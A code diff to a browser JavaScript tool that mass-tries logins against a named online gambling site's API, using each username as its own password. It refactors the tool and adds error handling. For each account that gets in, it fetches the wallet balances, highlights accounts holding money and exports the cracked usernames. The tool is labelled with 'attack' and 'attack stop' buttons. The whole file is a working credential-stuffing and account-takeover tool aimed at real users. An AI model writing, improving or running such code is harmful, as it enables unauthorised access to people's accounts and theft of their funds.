@@ -66,11 +66,11 @@ function downloadUsernames() {
     URL.revokeObjectURL(url);
 }
 
-document.getElementById("clearButton").addEventListener("click", function () {
-    document.getElementById("wordList").innerHTML = "";
-    document.getElementById("output").innerHTML = "";
-    document.getElementById("textInput").value = "";
-    document.getElementById("errorOutput").innerHTML = "";
+document.getElementById('clearButton').addEventListener('click', function () {
+    document.getElementById('wordList').innerHTML = '';
+    document.getElementById('output').innerHTML = '';
+    document.getElementById('textInput').value = '';
+    document.getElementById('errorOutput').innerHTML = '';
 });
 
 let stopRequested = false;
@@ -87,77 +87,83 @@ function fetchUsernamesFromProcessedList() {
 
 async function tryLogin(username) {
     if (stopRequested) return null;
-    console.log('')
 
     const loginData = {
-        domain: "https://www.krikya11.com",
+        domain: 'https://www.krikya11.com',
         membercode: username,
         password: username,
-        platform: "desktop",
-        option: "2",
+        platform: 'desktop',
+        option: '2',
     };
 
-    const loginResponse = await fetch("https://feapi.sharky777.xyz/api/token", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(loginData),
-    });
+    try {
+        const loginResponse = await fetch('https://feapi.sharky777.xyz/api/token', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(loginData),
+        });
 
-    const loginResult = await loginResponse.json();
+        const loginResult = await loginResponse.json();
 
-    if (loginResponse.ok) {
-        await fetchWalletDetails(loginResult.access_token, username);
-    } else {
-        displayErrorResponse(loginResponse.error);
-        console.log(`Loginfailed: ${username}`);
+        if (loginResponse.ok) {
+            await fetchWalletDetails(loginResult.access_token, username);
+        } else {
+            displayErrorResponse(username, loginResult.error);
+            console.log(`Login failed: ${username}`);
+        }
+    } catch (error) {
+        console.error(`Error logging in ${username}:`, error);
+        displayErrorResponse(username, error);
     }
 }
+
 async function fetchWalletDetails(token, username) {
     if (stopRequested) return;
 
-    const response = await fetch(
-        "https://feapi.sharky777.xyz/api/member/wallets",
-        {
-            method: "GET",
+    try {
+        const response = await fetch('https://feapi.sharky777.xyz/api/member/wallets', {
+            method: 'GET',
             headers: { Authorization: `Bearer ${token}` },
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+            const wallets = result.data.wallets.map(wallet => ({
+                code: wallet.wallet_code,
+                balance: parseFloat(wallet.balance),
+            }));
+            displaySuccessResponse(username, wallets);
+            successfulLogins.push({ username, wallets });
+            document.getElementById('downloadBtn').disabled = false;
+        } else {
+            displayErrorResponse(username, result.error);
         }
-    );
-
-    const result = await response.json();
-
-    if (response.ok) {
-        const wallets = result.data.wallets.map((wallet) => ({
-            code: wallet.wallet_code,
-            balance: parseFloat(wallet.balance),
-        }));
-        displaySuccessResponse(username, wallets);
-        successfulLogins.push({ username, wallets });
-        document.getElementById("downloadBtn").disabled = false;
+    } catch (error) {
+        console.error(`Error fetching wallet details for ${username}:`, error);
+        displayErrorResponse(username, error);
     }
 }
 
 function displaySuccessResponse(username, wallets) {
-    const successOutput = document.getElementById("successOutput");
-    const responseDiv = document.createElement("div");
+    const successOutput = document.getElementById('successOutput');
+    const responseDiv = document.createElement('div');
     responseDiv.innerHTML = `
-                <h3>${username}</h3>
-                <ul>
-                    ${wallets
-            .map(
-                (wallet) => `
-                        <li class="${wallet.balance >= 1 ? "balance-blue" : "hidden"}">
-                            ${wallet.code}: ${wallet.balance >= 1
-                        ? wallet.balance
-                        : parseInt(wallet.balance)
-                    }
-                        </li>
-                    `
-            )
-            .join("")}
-                </ul>
-            `;
+        <h3>${username}</h3>
+        <ul>
+            ${wallets
+                .map(
+                    wallet => `
+                    <li class="${wallet.balance >= 1 ? 'balance-blue' : 'hidden'}">
+                        ${wallet.code}: ${wallet.balance >= 1 ? wallet.balance : parseInt(wallet.balance)}
+                    </li>`
+                )
+                .join('')}
+        </ul>
+    `;
     successOutput.appendChild(responseDiv);
 }
+
 const attackButton = document.getElementById('attackButton');
 const attackstopButton = document.getElementById('attackstopButton');
 
@@ -173,28 +179,24 @@ attackstopButton.addEventListener('click', () => {
     stopLoginAttempts();
 });
 
-
-
-
-
 async function processLoginFile() {
     stopRequested = false;
     successfulLogins = [];
-    document.getElementById("successOutput").innerHTML = "<h3>USERNAME</h3>";
-    document.getElementById("errorOutput").innerHTML = "<h3></h3>";
-    document.getElementById("output").innerHTML = "";
-    document.getElementById("downloadBtn").disabled = false;
-    document.getElementById("loading").style.display = "flex";
+    document.getElementById('successOutput').innerHTML = '<h3>USERNAME</h3>';
+    document.getElementById('errorOutput').innerHTML = '<h3></h3>';
+    document.getElementById('output').innerHTML = '';
+    document.getElementById('downloadBtn').disabled = false;
+    document.getElementById('loading').style.display = 'flex';
 
     const usernames = fetchUsernamesFromProcessedList();
     logMessage(`📂 TOTAL ${usernames.length} USERNAMES FOUND...`);
 
     for (const username of usernames) {
         if (stopRequested) {
-            logMessage("STOPPED");
-            document.getElementById("loading").style.display = "none";
-            updateButton.style.display = "inline-block";
-            stopButton.style.display = "none";
+            logMessage('STOPPED');
+            document.getElementById('loading').style.display = 'none';
+            attackButton.style.display = 'inline-block';
+            attackstopButton.style.display = 'none';
             return;
         }
         try {
@@ -204,58 +206,50 @@ async function processLoginFile() {
         }
     }
 
-    document.getElementById("loading").style.display = "none";
+    document.getElementById('loading').style.display = 'none';
     downloadResponses();
-    alert("Login process finished!");
+    alert('Login process finished!');
 }
 
 function displayErrorResponse(username, error) {
-    const errorOutput = document.getElementById("errorOutput");
-    const responseDiv = document.createElement("div");
+    const errorOutput = document.getElementById('errorOutput');
+    const responseDiv = document.createElement('div');
     responseDiv.innerHTML = `
-                <h3>${username}</h3>
-                <p>Error: ${error.logMessage}</p>
-            `;
+        <h3>${username}</h3>
+        <p>Error: ${error.message}</p>
+    `;
     errorOutput.appendChild(responseDiv);
     errorOutput.scrollTop = errorOutput.scrollHeight;
 }
 
 function stopLoginAttempts() {
     stopRequested = true;
-    logMessage("⏹ Stopped");
-    document.getElementById("loading").style.display = "none";
+    logMessage('⏹ Stopped');
+    document.getElementById('loading').style.display = 'none';
 }
 
 function logMessage(message) {
-    const output = document.getElementById("output");
-    output.textContent += message + "\n";
+    const output = document.getElementById('output');
+    output.textContent += message + '\n';
 }
 
 function downloadResponses() {
     if (successfulLogins.length === 0) {
-        alert("No usernames available for download.");
+        alert('No usernames available for download.');
         return;
     }
 
     const usernamesContent = successfulLogins
-        .map((login) => login.username)
-        .join("\n");
+        .map(login => login.username)
+        .join('\n');
 
-    const usernamesBlob = new Blob([usernamesContent], { type: "text/plain" });
+    const usernamesBlob = new Blob([usernamesContent], { type: 'text/plain' });
     const usernamesUrl = URL.createObjectURL(usernamesBlob);
-    const usernamesA = document.createElement("a");
+    const usernamesA = document.createElement('a');
     usernamesA.href = usernamesUrl;
-    usernamesA.download = "usernames.txt";
+    usernamesA.download = 'usernames.txt';
     document.body.appendChild(usernamesA);
     usernamesA.click();
     document.body.removeChild(usernamesA);
     URL.revokeObjectURL(usernamesUrl);
 }
-
-
-
-
-
-
-
-
